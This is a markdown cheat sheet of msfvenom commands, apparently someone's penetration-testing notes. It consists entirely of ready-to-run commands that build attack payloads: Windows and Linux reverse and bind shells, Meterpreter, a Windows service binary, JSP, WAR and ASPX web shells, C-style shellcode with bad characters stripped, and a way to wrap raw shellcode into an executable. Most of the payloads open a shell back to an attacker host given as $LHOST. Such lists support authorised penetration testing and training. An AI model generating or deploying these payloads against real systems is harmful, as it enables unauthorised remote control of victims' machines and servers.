# MSFVENOM
## Windows Binary (.exe) executable
### 32 Bit (x86)
#### Reverse Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
```

#### Bind Shell
```bash
msfvenom -p windows/shell_bind_tcp LPORT=443 -f exe -o bind_shell.exe
```

##### Output in Hex, C Style, Exclude bad chars, Exitfunction thread
```bash
msfvenom -p windows/shell_bind_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

### 64 Bit (x64)

#### service
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe-service -o service.exe
```

#### Reverse Shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
```

#### Bind Shell
```bash
msfvenom -p windows/x64/shell_bind_tcp LPORT=443 -f exe -o bind_shell.exe
```

#### Meterpreter
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
```

## Linux Binary (.elf)
### 32 Bit (x86)
#### Reverse Shell
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > rev_shell.elf
```

#### Bind Shell
```bash
msfvenom -p linux/x86/shell/bind_tcp  LHOST=$LHOST -f elf > bind_shell.elf
```

#### Reverse Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > rev_shell.elf
```

#### Bind Shell
```bash
msfvenom -p linux/x64/shell/bind_tcp LHOST=$LHOST -f elf > rev_shell.elf
```

## Java Server Pages (.jsp)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f raw > shell.jsp
```

### As .war
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f war -o shell.war
```

## Active Sever Pages Extended (.aspx)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f aspx -o rev_shell.aspx
```

## tricks
### make executable binary with input shellcode
```bash
cat payload.bin | msfvenom -p - -f exe -a x64 --platform win -o output.exe
```
